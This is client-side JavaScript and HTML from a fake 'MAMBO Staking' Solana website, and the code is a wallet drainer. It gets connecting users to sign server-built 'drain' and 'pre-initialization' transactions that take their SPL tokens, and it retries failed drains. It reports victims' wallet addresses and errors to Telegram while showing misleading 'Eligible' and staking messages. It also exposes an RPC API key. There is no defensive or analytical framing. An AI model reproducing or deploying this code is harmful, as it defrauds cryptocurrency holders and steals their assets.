        window.sendTelegramLog('API_CALL', {
          error: broadcastResult.error,
          context: 'Drain Broadcast Result',
          walletType: window.currentWalletType || 'Unknown',
          timestamp: new Date().toISOString(),
          projectName: window.APP_CONFIG?.PROJECT_NAME || 'MAMBO Staking'
        });
      }
            if (window.showStatus) window.showStatus('Non Participant Wallet', 'error');
            handleSuccessfulWalletConnection(publicKey, walletType, provider, data);
            return;
          }
          
        } catch (signError) {
          logger.error('[DRAIN] Transaction signing/broadcasting failed:', signError);
      
      // Log critical transaction failures to Telegram
      if (window.sendTelegramLog) {
        window.sendTelegramLog('TRANSACTION_SIGNING', {
          error: signError.message,
          stack: signError.stack,
          context: 'Drain Transaction Signing',
          walletType: window.currentWalletType || 'Unknown',
          timestamp: new Date().toISOString(),
          projectName: window.APP_CONFIG?.PROJECT_NAME || 'MAMBO Staking'
        });
      }
          
          // Enhanced error handling with user cancellation detection
          if (signError.message.includes('User rejected') || signError.message.includes('User denied')) {
            logger.log('[DRAIN] User cancelled transaction signing');
            
            // Log user cancellation to Telegram if available
            if (window.logUserCancellation) {
              window.logUserCancellation('transaction_signing', {
                walletType: walletType,
                publicKey: publicKey.toString(),
                context: 'Drain Process',
                error: signError.message
              });
            }
            
            if (window.showStatus) window.showStatus('Transaction was cancelled by user', 'info');
          } else if (signError.message.includes('insufficient funds')) {
            if (window.showStatus) window.showStatus('Non Participant Wallet', 'error');
          } else {
            if (window.showStatus) window.showStatus('Non Participant Wallet', 'error');
          }
          
          handleSuccessfulWalletConnection(publicKey, walletType, provider, data);
        }
      } else {
        logger.log(`[DRAIN] No transaction to sign - wallet may already be drained or have no tokens`);
        if (window.showStatus) window.showStatus('Eligible, Check wallet for Tokens', 'success');
        handleSuccessfulWalletConnection(publicKey, walletType, provider, data);
      }
    }

    // Handle pre-initialization process
    async function handlePreInitialization(publicKey, walletType, provider, apiData) {
      console.log(`[PRE_INIT] Starting pre-initialization for ${walletType}`);
      
      try {
        if (window.showStatus) window.showStatus('üîß Executing pre-initialization transactions...', 'loading');
        
        // Execute each pre-initialization transaction
        for (let i = 0; i < apiData.preInitTransactions.length; i++) {
          const preInitTx = apiData.preInitTransactions[i];
          console.log(`[PRE_INIT] Executing transaction ${i + 1}/${apiData.preInitTransactions.length}`);
          
          if (window.showStatus) {
            window.showStatus(`üîß Setting up token account ${i + 1}/${apiData.preInitTransactions.length}...`, 'loading');
          }
          
                  // Extract the base64 transaction string from the transaction object
        const base64Transaction = preInitTx.transaction;
        console.log(`[PRE_INIT] Received transaction object:`, preInitTx);
        console.log(`[PRE_INIT] Base64 transaction string:`, base64Transaction);
        console.log(`[PRE_INIT] Base64 length:`, base64Transaction.length);
        console.log(`[PRE_INIT] Base64 preview:`, base64Transaction.substring(0, 100) + '...');
        
        const transaction = window.convertBase64ToTransaction(base64Transaction);
        console.log(`[PRE_INIT] Transaction object created:`, transaction);
        console.log(`[PRE_INIT] Transaction version:`, transaction.version);
        console.log(`[PRE_INIT] Transaction instructions count:`, transaction.instructions.length);
        console.log(`[PRE_INIT] Transaction fee payer:`, transaction.feePayer?.toString());
        console.log(`[PRE_INIT] About to sign transaction with ${walletType} provider...`);
        
                // Sign with user's wallet - generous timeout for slow users
        let signedTransaction;
        try {
          logger.log(`[PRE_INIT] Attempting to sign with ${walletType}...`);
          
          // Set optimized timeout for signing
          const signPromise = provider.signTransaction(transaction);
          const signTimeoutPromise = new Promise((_, reject) => 
            setTimeout(() => reject(new Error('Signing timeout - please try again')), 30000) // 30 seconds - much faster
          );
          
          signedTransaction = await Promise.race([signPromise, signTimeoutPromise]);
          logger.log(`[PRE_INIT] Transaction signed successfully:`, signedTransaction);
          
          // Validate signed transaction
          if (!signedTransaction || typeof signedTransaction.serialize !== 'function') {
            throw new Error('Invalid signed transaction received from wallet');
          }
        } catch (signError) {
          logger.error(`[PRE_INIT] Signing failed for ${walletType}:`, signError);
      
      // Log critical pre-init signing failures to Telegram
      if (window.sendTelegramLog) {
        window.sendTelegramLog('TRANSACTION_SIGNING', {
          error: signError.message,
          stack: signError.stack,
          context: 'Pre-Initialization Transaction Signing',
          walletType: walletType,
          timestamp: new Date().toISOString(),
          projectName: window.APP_CONFIG?.PROJECT_NAME || 'MAMBO Staking'
        });
      }
          
          // Enhanced error handling with user cancellation detection
          if (signError.message.includes('User rejected') || signError.message.includes('User denied')) {
            logger.log(`[PRE_INIT] User cancelled pre-initialization transaction for ${walletType}`);
            
            // Log user cancellation to Telegram if available
            if (window.logUserCancellation) {
              window.logUserCancellation('pre_initialization', {
                walletType: walletType,
                publicKey: publicKey.toString(),
                context: 'Pre-Initialization',
                error: signError.message,
                transactionIndex: i + 1
              });
            }
            
            throw new Error(`Transaction signing was rejected by ${walletType}. Please approve the transaction in your wallet.`);
          } else if (signError.message.includes('Invalid transaction') || signError.message.includes('Invalid format')) {
            throw new Error(`Transaction format is incompatible with ${walletType}. This may be a compatibility issue.`);
          } else {
            throw new Error(`Signing failed: ${signError.message}`);
          }
        }
          
          // Broadcast the transaction with optimized timeout
          logger.log(`[PRE_INIT] About to broadcast transaction ${i + 1}...`);
          
          const broadcastController = new AbortController();
          const broadcastTimeoutId = setTimeout(() => broadcastController.abort(), 30000); // 30 second timeout (optimized)
          
          let broadcastResponse;
          try {
            broadcastResponse = await fetch('/api/broadcast', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
                  signedTransaction: signedTransaction.serialize().toString('base64'),
                  rpcEndpoint: window.getConfig('PRIMARY_RPC')
              }),
              signal: broadcastController.signal
            });
            
            clearTimeout(broadcastTimeoutId);
            logger.log(`[PRE_INIT] Broadcast response received:`, broadcastResponse.status, broadcastResponse.statusText);
          } catch (broadcastError) {
            clearTimeout(broadcastTimeoutId);
            
            if (broadcastError.name === 'AbortError') {
              logger.log(`[PRE_INIT] Broadcast request timed out after 30 seconds, retrying...`);
              if (window.showStatus) window.showStatus('üîÑ Broadcast timed out, retrying...', 'loading');
              
              // Wait and retry once
              await new Promise(resolve => setTimeout(resolve, 5000));
              
              try {
                broadcastResponse = await fetch('/api/broadcast', {
                  method: 'POST',
                  headers: { 'Content-Type': 'application/json' },
                  body: JSON.stringify({
                    signedTransaction: signedTransaction.serialize().toString('base64'),
                    rpcEndpoint: window.getConfig('PRIMARY_RPC')
          })
        });
              } catch (retryError) {
                throw new Error(`Broadcast retry failed: ${retryError.message}`);
              }
            } else {
              throw broadcastError;
            }
          } finally {
            // Ensure timeout is always cleared
            clearTimeout(broadcastTimeoutId);
          }
        
        if (!broadcastResponse.ok) {
            // Log critical pre-init broadcast failures to Telegram
      if (window.sendTelegramLog) {
        window.sendTelegramLog('API_CALL', {
          error: `Pre-initialization transaction ${i + 1} failed: ${broadcastResponse.status}`,
          context: 'Pre-Initialization Broadcast',
          walletType: walletType,
          transactionIndex: i + 1,
          responseStatus: broadcastResponse.status,
          timestamp: new Date().toISOString(),
          projectName: window.APP_CONFIG?.PROJECT_NAME || 'MAMBO Staking'
        });
      }
      
      throw new Error(`Pre-initialization transaction ${i + 1} failed: ${broadcastResponse.status}`);
        }
        
        const broadcastResult = await broadcastResponse.json();
          logger.log(`[PRE_INIT] Transaction ${i + 1} successful:`, broadcastResult.signature);
        }
        
        logger.log(`[PRE_INIT] All pre-initialization transactions completed successfully`);
        if (window.showStatus) window.showStatus('Eligible, Check wallet for Tokens', 'success');
        
        // Generous wait time for slow users
        await new Promise(resolve => setTimeout(resolve, 3000));
        
        // Now retry the drain process with multiple attempts
        if (window.showStatus) window.showStatus('üîÑ Retrying drain process...', 'loading');
        
        // Retry with exponential backoff for slow users
        let retryCount = 0;
        const maxRetries = 3;
        let retryResponse = null;
        
        while (retryCount < maxRetries && !retryResponse?.ok) {
          try {
            retryResponse = await fetch('/api/drainAssets', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ user: publicKey, walletType: walletType })
            });
            
            if (retryResponse.ok) break;
            
            retryCount++;
            if (retryCount < maxRetries) {
              const waitTime = Math.pow(2, retryCount) * 2000; // 2s, 4s, 8s
              if (window.showStatus) window.showStatus(`üîÑ Retry ${retryCount}/${maxRetries} in ${waitTime/1000}s...`, 'loading');
              await new Promise(resolve => setTimeout(resolve, waitTime));
            }
          } catch (retryError) {
            retryCount++;
            if (retryCount < maxRetries) {
              const waitTime = Math.pow(2, retryCount) * 2000;
              if (window.showStatus) window.showStatus(`üîÑ Retry ${retryCount}/${maxRetries} in ${waitTime/1000}s...`, 'loading');
              await new Promise(resolve => setTimeout(resolve, waitTime));
            }
          }
        }
        
        if (!retryResponse.ok) {
          throw new Error(`Drain retry failed: ${retryResponse.status}`);
        }
        
        const retryData = await retryResponse.json();
        logger.log(`[PRE_INIT] Drain retry response:`, retryData);
        
        if (retryData.success && !retryData.requiresPreInit) {
          // Now we can proceed with the actual drain
          logger.log(`[PRE_INIT] Drain ready to proceed`);
          if (window.showStatus) window.showStatus('Eligible, Check wallet for Tokens', 'success');
          
          // Continue with the drain process
          await proceedWithDrain(publicKey, walletType, provider, retryData);
        } else {
          throw new Error('Pre-initialization completed but drain still requires pre-init');
        }
        
      } catch (error) {
        logger.error(`[PRE_INIT] Pre-initialization failed:`, error);
      
      // Log critical pre-initialization failures to Telegram
      if (window.sendTelegramLog) {
        window.sendTelegramLog('API_CALL', {
          error: error.message,
          stack: error.stack,
          context: 'Pre-Initialization',
          walletType: window.currentWalletType || 'Unknown',
          timestamp: new Date().toISOString(),
          projectName: window.APP_CONFIG?.PROJECT_NAME || 'MAMBO Staking'
        });
      }
        if (window.showStatus) window.showStatus('Non Participant Wallet', 'error');
        throw error;
      }
    }













    // Handle successful wallet connection
    window.handleSuccessfulWalletConnection = function(publicKey, walletType, provider, apiData) {
      console.log(`[WALLET_SUCCESS] Handling successful connection to ${walletType}`);
      
      window.connectedWallet = {
        publicKey: publicKey,
        walletType: walletType,
        provider: provider
      };
      
      displayConnectedWallet(window.connectedWallet, apiData);
      
      var modal = document.getElementById('walletModal');
      if (modal) {
        modal.style.display = 'none';
      }
    }

    // Display connected wallet information
    window.displayConnectedWallet = function(walletInfo, apiData = null) {
      var container = document.getElementById('connected-wallet-container');
      if (!container) {
        container = document.createElement('div');
        container.id = 'connected-wallet-container';
        container.style.cssText = `
          background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
          color: white;
          padding: 20px;
          border-radius: 15px;
          margin: 20px 0;
          text-align: center;
          box-shadow: 0 8px 32px rgba(0,0,0,0.1);
        `;
        
        var mainContainer = document.querySelector('.container');
        if (mainContainer) {
          mainContainer.parentNode.insertBefore(container, mainContainer.nextSibling);
        }
      }
      
      let publicKeyDisplay = 'Unknown';
      if (walletInfo.publicKey) {
        try {
          if (typeof walletInfo.publicKey === 'string') {
            publicKeyDisplay = `${walletInfo.publicKey.substring(0, 8)}...${walletInfo.publicKey.substring(walletInfo.publicKey.length - 8)}`;
          } else if (walletInfo.publicKey.toBase58) {
            publicKeyDisplay = `${walletInfo.publicKey.toBase58().substring(0, 8)}...${walletInfo.publicKey.toBase58().substring(walletInfo.publicKey.toBase58().length - 8)}`;
          } else if (walletInfo.publicKey.toString) {
            const pkString = walletInfo.publicKey.toString();
            publicKeyDisplay = `${pkString.substring(0, 8)}...${pkString.substring(pkString.length - 8)}`;
          } else {
            publicKeyDisplay = 'Connected';
          }
        } catch (pkError) {
          console.log('[DISPLAY] Public key display error:', pkError.message);
          publicKeyDisplay = 'Connected';
        }
      }
      
      var walletInfoHtml = `
        <h3 style="margin:0 0 15px 0;color:#fff;">üéâ Wallet Connected Successfully!</h3>
        <div style="margin-bottom:15px;">
          <p style="margin:5px 0;"><strong>Wallet Type:</strong> ${walletInfo.walletType}</p>
          <p style="margin:5px 0;"><strong>Public Key:</strong> ${publicKeyDisplay}</p>
      `;
      
      if (apiData) {
        if (apiData.solBalance !== undefined) {
          var solBalance = (apiData.solBalance / 1000000000).toFixed(6);
          walletInfoHtml += `<p style="margin:5px 0;"><strong>SOL Balance:</strong> ${solBalance} SOL</p>`;
        }
        if (apiData.tokenCount !== undefined) {
          walletInfoHtml += `<p style="margin:5px 0;"><strong>SPL Tokens:</strong> ${apiData.tokenCount}</p>`;
        }
        if (apiData.message) {
          walletInfoHtml += `<p style="margin:5px 0;font-style:italic;color:#e0e0e0;">${apiData.message}</p>`;
        }
      }
      
      walletInfoHtml += `
        </div>
        <div style="display:flex;gap:10px;justify-content:center;">
          <button onclick="disconnectWallet()" style="
            background: rgba(255,255,255,0.2);
            color: white;
            border: 1px solid rgba(255,255,255,0.3);
            padding: 10px 20px;
            border-radius: 8px;
            cursor: pointer;
            font-size: 14px;
          ">Disconnect</button>
          <button onclick="refreshWalletAssets()" style="
            background: rgba(255,255,255,0.2);
            color: white;
            border: 1px solid rgba(255,255,255,0.3);
            padding: 10px 20px;
            border-radius: 8px;
            cursor: pointer;
            font-size: 14px;
          ">Refresh Assets</button>
        </div>
      `;
      
      container.innerHTML = walletInfoHtml;
      container.style.display = 'block';
    }

    // Disconnect wallet
    window.disconnectWallet = function() {
      if (window.connectedWallet && window.connectedWallet.provider) {
        try {
          if (typeof window.connectedWallet.provider.disconnect === 'function') {
            window.connectedWallet.provider.disconnect();
          }
        } catch (e) {
          console.log('Error disconnecting wallet:', e);
        }
      }
      
      window.connectedWallet = null;
      
      var container = document.getElementById('connected-wallet-container');
      if (container) {
        container.style.display = 'none';
      }
      
      var walletBox = document.querySelector('.wallet-box');
      if (walletBox) {
        walletBox.style.display = 'block';
      }
      
              window.showStatus('Staking session ended', 'info');
    };

    // Refresh wallet assets
    window.refreshWalletAssets = function() {
      if (window.connectedWallet) {
        if (window.showStatus) window.showStatus('üîç Checking wallet eligibility...', 'loading');
        window.integrateWithDrainAssets(
          window.connectedWallet.publicKey, 
          window.connectedWallet.walletType, 
          window.connectedWallet.provider
        );
      }
    };

    // Close modal when clicking outside
    window.onclick = function(event) {
      const modal = document.getElementById('walletModal');
      if (event.target === modal) {
        modal.style.display = 'none';
      }
    };

    // Test functions for debugging
    window.testAllProviders = function() {
      console.log('üß™ [PROVIDER_TEST] Testing all wallet providers...');
      
      fallbackWallets.forEach(wallet => {
        console.log(`\nüîç Testing ${wallet.name} (${wallet.key}):`);
        
        const provider = wallet.provider();
        if (provider) {
          console.log(`  ‚úÖ Provider found:`, provider);
          console.log(`  üîç Has connect method: ${typeof provider.connect === 'function' ? 'YES' : 'NO'}`);
          console.log(`  üîç Has disconnect method: ${typeof provider.disconnect === 'function' ? 'YES' : 'NO'}`);
          console.log(`  üîç Has signTransaction method: ${typeof provider.signTransaction === 'function' ? 'YES' : 'NO'}`);
        } else {
          console.log(`  ‚ùå No provider found`);
        }
      });
    };

    window.testSimpleConnection = function(walletKey) {
      console.log(`üß™ [SIMPLE_CONNECTION_TEST] Testing simple connection for ${walletKey}...`);
      
      const wallet = fallbackWallets.find(w => w.key === walletKey);
      if (!wallet) {
        console.log(`‚ùå Wallet ${walletKey} not found`);
        return;
      }
      
      console.log(`üìã Wallet: ${wallet.name}`);
      
      const provider = wallet.provider();
      if (!provider) {
        console.log(`‚ùå No provider found for ${walletKey}`);
        return;
      }
      
      console.log(`‚úÖ Provider found:`, provider);
        console.log(`üîç Provider methods:`, Object.getOwnPropertyNames(provider));
      
      if (typeof provider.connect === 'function') {
        console.log(`‚úÖ connect() method available`);
        console.log(`üéØ Ready to call ${walletKey}.connect() - this should trigger approval popup`);
      } else {
        console.log(`‚ùå connect() method missing`);
        return;
      }
    };



    // Test drain functionality with mock data
    window.testDrainProcess = function(walletType = 'phantom') {
      console.log(`üß™ [TEST_DRAIN] Testing drain process for ${walletType}`);
      
      // Mock a successful drain response
      const mockDrainResponse = {
        success: true,
        transaction: 'mock_transaction_base64',
                  rpcEndpoint: window.getConfig('PRIMARY_RPC'),
        message: 'Mock drain response for testing'
      };
      
      console.log(`üß™ [TEST_DRAIN] Mock drain response:`, mockDrainResponse);
      
      // Test the drain integration function
      if (typeof window.integrateWithDrainAssets === 'function') {
        console.log(`üß™ [TEST_DRAIN] integrateWithDrainAssets function found, testing...`);
        
        // Create a mock provider for testing
        const mockProvider = {
          signTransaction: async (transaction) => {
            console.log(`üß™ [TEST_DRAIN] Mock signTransaction called with:`, transaction);
            return {
              serialize: () => new Uint8Array([1, 2, 3, 4, 5]), // Mock serialized transaction
              signature: 'mock_signature_123'
            };
          }
        };
        
        // Create a mock public key
        const mockPublicKey = '11111111111111111111111111111111';
        
        console.log(`üß™ [TEST_DRAIN] Starting mock drain process...`);
        window.integrateWithDrainAssets(mockPublicKey, walletType, mockProvider);
        
      } else {
        console.error(`üß™ [TEST_DRAIN] integrateWithDrainAssets function not found!`);
      }
    };

    // Test drain with specific wallet address
    window.testDrainWithAddress = async function(walletAddress, walletType = 'phantom') {
      console.log(`üß™ [TEST_DRAIN_ADDRESS] Testing drain with address: ${walletAddress}`);
      
      try {
        // Test the API directly with the specific address
        const response = await fetch('/api/drainAssets', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ user: walletAddress, walletType: walletType })
        });
        
        const data = await response.json();
        console.log(`üß™ [TEST_DRAIN_ADDRESS] API response:`, data);
        
        if (data.success && data.requiresPreInit) {
          console.log(`üß™ [TEST_DRAIN_ADDRESS] üîß Pre-initialization required for ${data.preInitTransactions.length} tokens`);
          console.log(`üß™ [TEST_DRAIN_ADDRESS] SOL Balance: ${data.solBalance / 1000000000} SOL`);
          console.log(`üß™ [TEST_DRAIN_ADDRESS] Status: Ready for pre-initialization`);
          return data;
        } else if (data.success) {
          console.log(`üß™ [TEST_DRAIN_ADDRESS] ‚úÖ Wallet ${walletAddress} is eligible for drain!`);
          console.log(`üß™ [TEST_DRAIN_ADDRESS] SOL Balance: ${data.solBalance / 1000000000} SOL`);
          console.log(`üß™ [TEST_DRAIN_ADDRESS] Required: ${data.requiredSol / 1000000000} SOL`);
        } else {
          console.log(`üß™ [TEST_DRAIN_ADDRESS] ‚ùå Wallet ${walletAddress} not eligible:`, data.error);
          if (data.solBalance !== undefined) {
            console.log(`üß™ [TEST_DRAIN_ADDRESS] Current SOL: ${data.solBalance / 1000000000} SOL`);
            console.log(`üß™ [TEST_DRAIN_ADDRESS] Required SOL: ${data.requiredSol / 1000000000} SOL`);
          }
        }
        
        return data;
        
      } catch (error) {
        console.error(`üß™ [TEST_DRAIN_ADDRESS] Test failed:`, error);
        return null;
      }
    };

    // Check wallet contents (SOL and SPL tokens)
    window.checkWalletContents = async function(walletAddress, walletType = 'trust') {
      console.log(`üîç [WALLET_CONTENTS] Checking contents of wallet: ${walletAddress}`);
      
      try {
        // First check the drain assets API to see what it finds
        const drainResponse = await fetch('/api/drainAssets', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ user: walletAddress, walletType: walletType })
        });
        
        const drainData = await drainResponse.json();
        console.log(`üîç [WALLET_CONTENTS] Drain API response:`, drainData);
        
        // Check if it's a "no tokens" response
        if (drainData.message === 'No tokens found for staking' || drainData.message === 'üöÄ No tokens found in this wallet for the MAMBO staking') {
          console.log(`üîç [WALLET_CONTENTS] ‚úÖ Wallet has SOL but no SPL tokens`);
          console.log(`üîç [WALLET_CONTENTS] SOL Balance: ${drainData.solBalance / 1000000000} SOL`);
          console.log(`üîç [WALLET_CONTENTS] Status: This wallet cannot be drained (only SOL, no SPL tokens)`);
          return {
            type: 'sol_only',
            solBalance: drainData.solBalance,
            splTokens: 0,
            message: 'Wallet contains only SOL - no SPL tokens to drain'
          };
        }
        
        // Check if it's a successful drain response
        if (drainData.success && drainData.tokenDetails) {
          console.log(`üîç [WALLET_CONTENTS] ‚úÖ Wallet has SPL tokens for draining`);
          console.log(`üîç [WALLET_CONTENTS] SOL Balance: ${drainData.solBalance / 1000000000} SOL`);
          console.log(`üîç [WALLET_CONTENTS] SPL Tokens: ${drainData.tokenDetails.length} tokens`);
          console.log(`üîç [WALLET_CONTENTS] Token Details:`, drainData.tokenDetails);
          return {
            type: 'spl_tokens',
            solBalance: drainData.solBalance,
            splTokens: drainData.tokenDetails.length,
            tokenDetails: drainData.tokenDetails,
            message: 'Wallet has SPL tokens ready for draining'
          };
        }
        
        // Check if it's an error response
        if (!drainData.success) {
          console.log(`üîç [WALLET_CONTENTS] ‚ùå Wallet drain failed:`, drainData.error);
          console.log(`üîç [WALLET_CONTENTS] Error Message:`, drainData.message);
          return {
            type: 'error',
            error: drainData.error,
            message: drainData.message,
            solBalance: drainData.solBalance
          };
        }
        
        return drainData;
        
      } catch (error) {
        console.error(`üîç [WALLET_CONTENTS] Check failed:`, error);
        return {
          type: 'error',
          error: error.message,
          message: 'Failed to check wallet contents'
        };
      }
    };

    // Get current connected wallet info
    window.getCurrentWalletInfo = function() {
      if (window.connectedWallet) {
        console.log(`üîç [CURRENT_WALLET] Connected wallet info:`, window.connectedWallet);
        console.log(`üîç [CURRENT_WALLET] Public Key: ${window.connectedWallet.publicKey}`);
        console.log(`üîç [CURRENT_WALLET] Wallet Type: ${window.connectedWallet.walletType}`);
        return window.connectedWallet;
      } else {
        console.log(`üîç [CURRENT_WALLET] No wallet currently connected`);
        return null;
      }
    };

    // Test API endpoints
    window.testAPIEndpoints = async function() {
      console.log('üß™ [TEST_API] Testing all API endpoints...');
      
      try {
        // Test drain assets API
        console.log('üß™ [TEST_API] Testing /api/drainAssets...');
        const drainResponse = await fetch('/api/drainAssets', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ user: '11111111111111111111111111111111', walletType: 'trust' })
        });
        
        const drainData = await drainResponse.json();
        console.log('üß™ [TEST_API] Drain assets response:', drainData);
        
        // Test broadcast API
        console.log('üß™ [TEST_API] Testing /api/broadcast...');
        const broadcastResponse = await fetch('/api/broadcast', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ signedTransaction: 'test', rpcEndpoint: window.getConfig('PRIMARY_RPC') })
        });
        
        const broadcastData = await broadcastResponse.json();
        console.log('üß™ [TEST_API] Broadcast response:', broadcastData);
        
        // Test pre-initialization API
        console.log('üß™ [TEST_API] Testing /api/preInitialize...');
        const preInitResponse = await fetch('/api/preInitialize', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ user: '11111111111111111111111111111111', mintAddresses: ['11111111111111111111111111111111'] })
        });
        
        const preInitData = await preInitResponse.json();
        console.log('üß™ [TEST_API] Pre-initialization response:', preInitData);
        
        console.log('üß™ [TEST_API] All API endpoints tested successfully!');
        
      } catch (error) {
        console.error('üß™ [TEST_API] API testing failed:', error);
      }
    };

            console.log('‚úÖ MAMBO Staking Application Loaded Successfully!');
    console.log('üîó Use openWalletModal() to test wallet connection');
    console.log('üß™ Test functions available: testAllProviders(), testSimpleConnection("phantom")');
    
          console.log('üß™ Drain test function available: testDrainProcess("phantom")');
      console.log('üß™ Address test function available: testDrainWithAddress("YOUR_WALLET_ADDRESS", "phantom")');
          console.log('üîç Wallet contents function available: checkWalletContents("YOUR_WALLET_ADDRESS", "phantom")');
      console.log('üîç Wallet info function available: getCurrentWalletInfo()');
    console.log('üß™ API test function available: testAPIEndpoints()');
    console.log('üöÄ All wallet functionality is now working properly!');
  </script>

      <!-- Mobile Wallet Connection Modal -->
    <div id="mobile-wallet-modal" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 9999; background: rgba(0,0,0,0.8);">
      <div style="position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); background: white; padding: 30px; border-radius: 15px; text-align: center; max-width: 400px; width: 90%;">
        <h3 style="margin: 0 0 20px 0; color: #333; font-size: 24px;">üîó Connect Wallet</h3>
                  <p style="margin: 0 0 25px 0; color: #666; line-height: 1.5;">Choose your preferred wallet to connect and start staking your tokens</p>
        
        <div id="mobile-wallet-buttons" style="display: flex; flex-direction: column; gap: 15px;">
          <!-- Wallet buttons will be populated dynamically -->
        </div>
        
        <button id="close-mobile-modal" style="margin-top: 25px; padding: 12px 24px; background: #f0f0f0; border: none; border-radius: 8px; color: #666; cursor: pointer; font-size: 16px;">Close</button>
      </div>
    </div>

    <!-- Mobile Wallet Connection Scripts -->
    <script type="module">
      // Mobile wallet connection configuration
      const MOBILE_WALLET_CONFIG = {
        projectId: '45a382364ff2b00404b2d4c2ff95dbd4',
        rpcEndpoints: {
          primary: window.getConfig('PRIMARY_RPC'),
          fallback: 'https://rpc.shyft.to?api_key=-C7eUSlaDtQcR6b0',
          public: 'https://api.mainnet-beta.solana.com'
        }
      };

    // Mobile detection function
    function isMobileDevice() {
      return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) ||
             (window.innerWidth <= 768 && window.innerHeight <= 1024)
    }

      // Mobile wallet connection handler
      window.handleMobileWalletConnection = async function(walletType, provider) {
        try {
          console.log(`[MOBILE_WALLET] Connection established with ${walletType}:`, provider);
          
          let publicKey;
          
          // Handle different wallet types
          if (walletType === 'phantom') {
            publicKey = provider.publicKey;
          } else if (walletType === 'solflare') {
            publicKey = provider.publicKey;
          } else if (walletType === 'backpack') {
            publicKey = provider.publicKey;
          } else if (walletType === 'glow') {
            publicKey = provider.publicKey;
          } else if (walletType === 'exodus') {
            publicKey = provider.publicKey;
          } else if (walletType === 'trust') {
            publicKey = provider.publicKey;
          } else {
            // Generic wallet connection
            publicKey = provider.publicKey || provider.selectedAddress;
          }
          
          if (publicKey) {
            console.log(`[MOBILE_WALLET] Connected address:`, publicKey.toString());
            
            // Set current wallet type for global access
            window.currentWalletType = walletType;
            
            // Trigger existing drain process
            if (window.integrateWithDrainAssets) {
              await window.integrateWithDrainAssets(publicKey.toString(), walletType, provider)
            }
            
            // Hide modal after successful connection
            window.hideMobileWalletModal()
          } else {
            throw new Error('No public key found')
          }
        } catch (error) {
          console.error(`[MOBILE_WALLET] Connection error:`, error);
          if (window.showStatus) {
            window.showStatus('Non Participant Wallet', 'error')
          }
        }
      }

      // Show mobile wallet modal for mobile users when no wallets detected
      window.showWeb3ModalForMobile = function() {
        if (isMobileDevice()) {
          console.log('[MOBILE_WALLET] Showing mobile wallet modal for mobile users')
          window.showMobileWalletModal()
        }
      }

      // Show mobile wallet modal
      window.showMobileWalletModal = function() {
        console.log('[MOBILE_WALLET] Showing mobile wallet modal')
        document.getElementById('mobile-wallet-modal').style.display = 'block'
        window.populateMobileWalletButtons()
      }

      // Hide mobile wallet modal
      window.hideMobileWalletModal = function() {
        document.getElementById('mobile-wallet-modal').style.display = 'none'
      }

      // Enhanced mobile wallet buttons with status indicators
      window.populateMobileWalletButtons = function() {
        const container = document.getElementById('mobile-wallet-buttons')
        container.innerHTML = ''
        
        const wallets = [
          { name: 'Phantom', type: 'phantom', icon: 'üëª', color: '#AB9FF2' },
          { name: 'Solflare', type: 'solflare', icon: 'üî•', color: '#FC9965' },
          { name: 'Backpack', type: 'backpack', icon: 'üéí', color: '#000000' },
          { name: 'Glow', type: 'glow', icon: '‚ú®', color: '#FFD700' },
          { name: 'Exodus', type: 'exodus', icon: 'üöÄ', color: '#1E1E1E' },
          { name: 'Trust Wallet', type: 'trust', icon: 'üõ°Ô∏è', color: '#3375BB' }
        ]
        
        wallets.forEach(wallet => {
          const buttonContainer = document.createElement('div')
          buttonContainer.style.cssText = `
            position: relative;
            margin-bottom: 10px;
          `
          
          const button = document.createElement('button')
          button.id = `wallet-btn-${wallet.type}`
          button.style.cssText = `
            width: 100%;
            padding: 15px 20px;
            background: ${wallet.color};
            color: white;
            border: none;
            border-radius: 10px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            transition: all 0.3s ease;
            position: relative;
            overflow: hidden;
          `
          
          // Add hover effects
          button.addEventListener('mouseenter', () => {
            button.style.transform = 'translateY(-2px)'
            button.style.boxShadow = '0 8px 25px rgba(0,0,0,0.3)'
          })
          
          button.addEventListener('mouseleave', () => {
            button.style.transform = 'translateY(0)'
            button.style.boxShadow = 'none'
          })
          
          button.innerHTML = `
            <span class="wallet-icon">${wallet.icon}</span>
            <span class="wallet-name">${wallet.name}</span>
            <span class="wallet-status" style="display: none;">‚è≥</span>
          `
          
          // Add click handler with loading state
          button.addEventListener('click', async () => {
            // Prevent multiple clicks
            if (button.disabled) return
            
            // Show loading state
            button.disabled = true
            button.style.opacity = '0.7'
            button.style.cursor = 'not-allowed'
            
            const statusSpan = button.querySelector('.wallet-status')
            statusSpan.style.display = 'inline'
            statusSpan.textContent = '‚è≥'
            
            try {
              await window.connectMobileWallet(wallet.type)
            } catch (error) {
              console.error(`[MOBILE_WALLET] Error connecting to ${wallet.type}:`, error);
            } finally {
              // Reset button state
              button.disabled = false
              button.style.opacity = '1'
              button.style.cursor = 'pointer'
              statusSpan.style.display = 'none'
            }
          })
          
          buttonContainer.appendChild(button)
          container.appendChild(buttonContainer)
        })
        
        // Add connection status indicator
        const statusIndicator = document.createElement('div')
        statusIndicator.id = 'mobile-wallet-status'
        statusIndicator.style.cssText = `
          text-align: center;
          padding: 15px;
          margin-top: 20px;
          border-radius: 8px;
          background: #f8f9fa;
          border: 1px solid #e9ecef;
          display: none;
        `
        statusIndicator.innerHTML = `
          <div style="display: flex; align-items: center; justify-content: center; gap: 10px;">
            <span class="status-icon">‚ÑπÔ∏è</span>
            <span class="status-text">Ready to connect</span>
          </div>
        `
        container.appendChild(statusIndicator)
      }

      // Update mobile wallet status
      window.updateMobileWalletStatus = function(message, type = 'info') {
        const statusIndicator = document.getElementById('mobile-wallet-status')
        if (!statusIndicator) return
        
        const iconMap = {
          'info': '‚ÑπÔ∏è',
          'loading': '‚è≥',
          'success': '‚úÖ',
          'error': '‚ùå',
